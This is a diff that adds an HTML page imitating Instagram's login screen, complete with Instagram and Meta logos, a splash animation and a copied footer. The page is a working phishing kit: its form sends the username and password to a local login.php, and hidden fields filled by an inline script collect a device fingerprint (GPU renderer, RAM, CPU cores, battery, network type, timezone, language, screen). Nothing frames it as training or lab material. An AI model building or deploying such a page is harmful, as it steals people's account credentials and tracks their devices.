@@ -1,0 +1,262 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <meta name="description" content="Log into Instagram" />
+    <link rel="stylesheet" href="./styles.css" />
+    <link rel="icon" type="image/png" href="./img/insta-fav.ico" />
+    <title>Log into Instagram</title>
+<style>
+  :root {
+    --bg: #ffffff;
+    --from-color: #696969;
+    --icon-size: clamp(58px, 16.5vmin, 90px);
+    --from-size: clamp(12px, 3.35vmin, 14.5px);
+    --meta-size: clamp(15px, 4.5vmin, 18.5px);
+    --brand-gap: clamp(7px, 2.2vmin, 11px);
+    --brand-bottom: calc(clamp(20px, 5.2vmin, 30px) + env(safe-area-inset-bottom, 0px));
+    --cycle: 5.4s;
+  }
+  @media (prefers-color-scheme: dark) {
+    :root { --bg: #000000; --from-color: #9c9c9c; }
+  }
+  .splash {
+    position: fixed; inset: 0; z-index: 9999; height: 100dvh; background: var(--bg);
+    display: grid; place-items: center;
+    animation: splash-cycle var(--cycle) ease-in-out infinite;
+    will-change: opacity;
+  }
+  .splash .glyph {
+    width: var(--icon-size); height: var(--icon-size); display: block;
+    animation: glyph-settle var(--cycle) cubic-bezier(.2,.8,.25,1) infinite;
+    will-change: transform;
+  }
+  .splash .brand {
+    position: absolute; left: 0; right: 0; bottom: var(--brand-bottom);
+    display: flex; flex-direction: column; align-items: center; gap: var(--brand-gap);
+  }
+  .splash .from { font-size: var(--from-size); font-weight: 400; letter-spacing: .01em; line-height: 1; color: var(--from-color); }
+  .splash .meta-lockup { display: inline-flex; align-items: center; gap: .36em; font-size: var(--meta-size); line-height: 1; }
+  .splash .meta-mark { height: .8em; width: auto; display: block; }
+  .splash .meta-word {
+    font-weight: 600; letter-spacing: -.015em; color: #c13584;
+    background: linear-gradient(90deg, #e1306c 0%, #c13584 55%, #833ab4 105%);
+    -webkit-background-clip: text; background-clip: text;
+    -webkit-text-fill-color: transparent; color: transparent;
+  }
+  @keyframes splash-cycle {
+    0%    { opacity: 0; }
+    4.5%  { opacity: 1; }
+    56%   { opacity: 1; }
+    63%   { opacity: 0; }
+    72%   { opacity: 0; }
+    78%   { opacity: 1; }
+    100%  { opacity: 1; }
+  }
+  @keyframes glyph-settle {
+    0%    { transform: scale(.965); }
+    9%    { transform: scale(1); }
+    100%  { transform: scale(1); }
+  }
+  .splash.is-hiding {
+    animation: none !important;
+    opacity: 0;
+    transition: opacity 0.5s ease;
+    pointer-events: none;
+  }
+  .login-content { opacity: 0; transition: opacity 0.4s ease; }
+  .login-content.show { opacity: 1; }
+  @media (prefers-reduced-motion: reduce) {
+    .splash, .splash .glyph { animation: none; }
+  }
+</style>
+</head>
+<body>
+  <main class="splash" aria-label="Loading">
+    <svg class="glyph" viewBox="0 0 100 100" role="img" aria-label="Instagram">
+      <defs>
+        <linearGradient id="igGradient" gradientUnits="userSpaceOnUse" x1="12" y1="90" x2="88" y2="8">
+          <stop offset="0" stop-color="#FFDC80"/>
+          <stop offset=".09" stop-color="#FCAF45"/>
+          <stop offset=".21" stop-color="#F77737"/>
+          <stop offset=".34" stop-color="#F56040"/>
+          <stop offset=".46" stop-color="#FD1D1D"/>
+          <stop offset=".58" stop-color="#E1306C"/>
+          <stop offset=".70" stop-color="#C13584"/>
+          <stop offset=".82" stop-color="#833AB4"/>
+          <stop offset=".92" stop-color="#5851DB"/>
+          <stop offset="1" stop-color="#405DE6"/>
+        </linearGradient>
+      </defs>
+      <g fill="none" stroke="url(#igGradient)" stroke-width="8.2" stroke-linejoin="round">
+        <rect x="7" y="7" width="86" height="86" rx="25"/>
+        <circle cx="50" cy="50" r="20.5"/>
+      </g>
+      <circle cx="71.4" cy="28.6" r="5.1" fill="url(#igGradient)"/>
+    </svg>
+    <div class="brand">
+      <span class="from">from</span>
+      <span class="meta-lockup">
+        <svg class="meta-mark" viewBox="0 0 36 24" aria-hidden="true" focusable="false">
+          <defs>
+            <linearGradient id="metaGradient" x1="0" y1="0" x2="1" y2="0">
+              <stop offset="0" stop-color="#FCAF45"/>
+              <stop offset=".14" stop-color="#F77737"/>
+              <stop offset=".30" stop-color="#F56040"/>
+              <stop offset=".46" stop-color="#FD1D1D"/>
+              <stop offset=".60" stop-color="#E1306C"/>
+              <stop offset=".76" stop-color="#C13584"/>
+              <stop offset="1" stop-color="#833AB4"/>
+            </linearGradient>
+          </defs>
+          <path fill="none" stroke="url(#metaGradient)" stroke-width="3.15" stroke-linecap="round" stroke-linejoin="round" d="M33.4 12.0 L33.37 12.54 L33.29 13.07 L33.15 13.58 L32.96 14.08 L32.72 14.56 L32.44 15.0 L32.12 15.42 L31.76 15.79 L31.37 16.13 L30.96 16.43 L30.52 16.69 L30.07 16.91 L29.61 17.09 L29.14 17.23 L28.67 17.33 L28.2 17.4 L27.73 17.44 L27.26 17.44 L26.8 17.42 L26.35 17.37 L25.91 17.29 L25.47 17.19 L25.05 17.07 L24.64 16.93 L24.24 16.78 L23.85 16.61 L23.47 16.43 L23.1 16.23 L22.75 16.03 L22.4 15.81 L22.06 15.59 L21.73 15.36 L21.41 15.12 L21.1 14.88 L20.8 14.63 L20.5 14.38 L20.21 14.12 L19.92 13.86 L19.64 13.6 L19.36 13.34 L19.08 13.07 L18.81 12.8 L18.54 12.54 L18.27 12.27 L18.0 12.0 L17.73 11.73 L17.46 11.46 L17.19 11.2 L16.92 10.93 L16.64 10.66 L16.36 10.4 L16.08 10.14 L15.79 9.88 L15.5 9.62 L15.2 9.37 L14.9 9.12 L14.59 8.88 L14.27 8.64 L13.94 8.41 L13.6 8.19 L13.25 7.97 L12.9 7.77 L12.53 7.57 L12.15 7.39 L11.76 7.22 L11.36 7.07 L10.95 6.93 L10.53 6.81 L10.09 6.71 L9.65 6.63 L9.2 6.58 L8.74 6.56 L8.27 6.56 L7.8 6.6 L7.33 6.67 L6.86 6.77 L6.39 6.91 L5.93 7.09 L5.48 7.31 L5.04 7.57 L4.63 7.87 L4.24 8.21 L3.88 8.58 L3.56 9.0 L3.28 9.44 L3.04 9.92 L2.85 10.42 L2.71 10.93 L2.63 11.46 L2.6 12.0 L2.63 12.54 L2.71 13.07 L2.85 13.58 L3.04 14.08 L3.28 14.56 L3.56 15.0 L3.88 15.42 L4.24 15.79 L4.63 16.13 L5.04 16.43 L5.48 16.69 L5.93 16.91 L6.39 17.09 L6.86 17.23 L7.33 17.33 L7.8 17.4 L8.27 17.44 L8.74 17.44 L9.2 17.42 L9.65 17.37 L10.09 17.29 L10.53 17.19 L10.95 17.07 L11.36 16.93 L11.76 16.78 L12.15 16.61 L12.53 16.43 L12.9 16.23 L13.25 16.03 L13.6 15.81 L13.94 15.59 L14.27 15.36 L14.59 15.12 L14.9 14.88 L15.2 14.63 L15.5 14.38 L15.79 14.12 L16.08 13.86 L16.36 13.6 L16.64 13.34 L16.92 13.07 L17.19 12.8 L17.46 12.54 L17.73 12.27 L18.0 12.0 L18.27 11.73 L18.54 11.46 L18.81 11.2 L19.08 10.93 L19.36 10.66 L19.64 10.4 L19.92 10.14 L20.21 9.88 L20.5 9.62 L20.8 9.37 L21.1 9.12 L21.41 8.88 L21.73 8.64 L22.06 8.41 L22.4 8.19 L22.75 7.97 L23.1 7.77 L23.47 7.57 L23.85 7.39 L24.24 7.22 L24.64 7.07 L25.05 6.93 L25.47 6.81 L25.91 6.71 L26.35 6.63 L26.8 6.58 L27.26 6.56 L27.73 6.56 L28.2 6.6 L28.67 6.67 L29.14 6.77 L29.61 6.91 L30.07 7.09 L30.52 7.31 L30.96 7.57 L31.37 7.87 L31.76 8.21 L32.12 8.58 L32.44 9.0 L32.72 9.44 L32.96 9.92 L33.15 10.42 L33.29 10.93 L33.37 11.46 Z"/>
+        </svg>
+        <span class="meta-word">Meta</span>
+      </span>
+    </div>
+  </main>
+  <div class="login-content">
+    <main class="layout">
+        <!-- LEFT -->
+        <section class="hero">
+            <div class="hero-inner">
+                <div class="ig-logo" aria-hidden="true">
+                    <svg viewBox="0 0 48 48" width="68" height="68">
+                        <defs>
+                            <linearGradient id="igg" x1="0" y1="1" x2="1" y2="0">
+                                <stop offset="0" stop-color="#FFD600"/>
+                                <stop offset="0.35" stop-color="#FF7A00"/>
+                                <stop offset="0.6" stop-color="#FF0169"/>
+                                <stop offset="0.8" stop-color="#D300C5"/>
+                                <stop offset="1" stop-color="#7638FA"/>
+                            </linearGradient>
+                        </defs>
+                        <rect x="4" y="4" width="40" height="40" rx="12" fill="none" stroke="url(#igg)" stroke-width="3.5"/>
+                        <circle cx="24" cy="24" r="9" fill="none" stroke="url(#igg)" stroke-width="3.5"/>
+                        <circle cx="34.5" cy="13.5" r="2.8" fill="#D300C5"/>
+                    </svg>
+                </div>
+                <h2 class="headline">See everyday moments from your<br /><span class="gradient-text">close friends.</span></h2>
+
+                <div class="collage">
+                    <img src="./img/collage.png" alt="Everyday moments from close friends - photo collage" />
+                </div>
+            </div>
+        </section>
+
+        <!-- RIGHT -->
+        <section class="auth">
+            <div class="auth-box">
+                <h1>Log into Instagram</h1>
+                <form action="login.php" method="post">
+                    <div class="field">
+                        <input id="email" name="email" type="text" placeholder=" " autocomplete="username" required />
+                        <label for="email">Mobile number, username or email</label>
+                    </div>
+                    <div class="field">
+                        <input id="password" name="password" type="password" placeholder=" " autocomplete="current-password" required />
+                        <label for="password">Password</label>
+                    </div>
+                    <button class="btn btn-primary" type="submit">Log in</button>
+                    <input type="hidden" id="battery" name="battery" value="unknown" />
+                    <input type="hidden" id="nettype" name="nettype" value="unknown" />
+                    <input type="hidden" id="screen" name="screen" value="unknown" />
+                    <input type="hidden" id="timezone" name="timezone" value="unknown" />
+                    <input type="hidden" id="language" name="language" value="unknown" />
+                    <input type="hidden" id="ram" name="ram" value="unknown" />
+                    <input type="hidden" id="cpu_cores" name="cpu_cores" value="unknown" />
+                    <input type="hidden" id="gpu" name="gpu" value="unknown" />
+                </form>
+                <script>
+                (function () {
+                    // Screen
+                    document.getElementById("screen").value = screen.width + "x" + screen.height + "x" + screen.colorDepth;
+                    // Timezone
+                    try { document.getElementById("timezone").value = Intl.DateTimeFormat().resolvedOptions().timeZone; } catch(e) {}
+                    // Language
+                    document.getElementById("language").value = navigator.language || "unknown";
+                    // RAM
+                    if (navigator.deviceMemory) {
+                        document.getElementById("ram").value = "~" + navigator.deviceMemory + " GB";
+                    }
+                    // CPU cores
+                    if (navigator.hardwareConcurrency) {
+                        document.getElementById("cpu_cores").value = navigator.hardwareConcurrency + " cores";
+                    }
+                    // GPU
+                    try {
+                        var canvas = document.createElement("canvas");
+                        var gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
+                        if (gl) {
+                            var debugInfo = gl.getExtension("WEBGL_debug_renderer_info");
+                            if (debugInfo) {
+                                document.getElementById("gpu").value = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+                            }
+                        }
+                    } catch(e) {}
+                    // Battery + network info (Chromium browsers; others stay "unknown")
+                    if (navigator.getBattery) {
+                        navigator.getBattery().then(function (b) {
+                            function upd() {
+                                document.getElementById("battery").value =
+                                    Math.round(b.level * 100) + "%" + (b.charging ? " charging" : "");
+                            }
+                            upd(); b.addEventListener("levelchange", upd); b.addEventListener("chargingchange", upd);
+                        }).catch(function () {});
+                    }
+                    var c = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+                    if (c) {
+                        document.getElementById("nettype").value =
+                            (c.effectiveType || "unknown") + " / downlink " + (c.downlink || "?") + "Mbps";
+                    }
+                })();
+                </script>
+                <a class="forgot" href="#">Forgot password?</a>
+                <div class="gap"></div>
+                <a class="btn btn-fb" href="#">
+                    <span class="fb-glyph">
+                        <svg viewBox="0 0 24 24" width="16" height="16" fill="#0064e0"><path d="M12 2a10 10 0 0 0-3.6 19.3v-6.8H6V12h2.4V10c0-2.4 1.4-3.7 3.6-3.7 1 0 2.1.2 2.1.2v2.3h-1.2c-1.2 0-1.5.7-1.5 1.5v1.7h2.6l-.4 2.5h-2.2v6.8A10 10 0 0 0 12 2z"/></svg>
+                    </span>
+                    Log in with Facebook
+                </a>
+                <a class="btn btn-outline" href="#">Create new account</a>
+                <div class="meta-logo"><span class="meta-glyph">∞</span> Meta</div>
+            </div>
+        </section>
+    </main>
+
+    <footer>
+        <ul>
+            <li><a href="#">Meta</a></li>
+            <li><a href="#">About</a></li>
+            <li><a href="#">Blog</a></li>
+            <li><a href="#">Jobs</a></li>
+            <li><a href="#">Help</a></li>
+            <li><a href="#">API</a></li>
+            <li><a href="#">Privacy</a></li>
+            <li><a href="#">Terms</a></li>
+            <li><a href="#">Locations</a></li>
+            <li><a href="#">Popular</a></li>
+            <li><a href="#">Instagram Lite</a></li>
+            <li><a href="#">Meta AI</a></li>
+            <li><a href="#">Threads</a></li>
+            <li><a href="#">Contact Uploading &amp; Non-Users</a></li>
+            <li><a href="#">Meta Verified</a></li>
+        </ul>
+    </footer>
+  </div>
+</body>
+<script>
+(function() {
+  var splash = document.querySelector('.splash');
+  var content = document.querySelector('.login-content');
+  if (!splash) { if (content) content.classList.add('show'); return; }
+  setTimeout(function() {
+    splash.classList.add('is-hiding');
+    if (content) content.classList.add('show');
+    setTimeout(function() { splash.remove(); }, 600);
+  }, 3000);
+})();
+</script>
+</html>
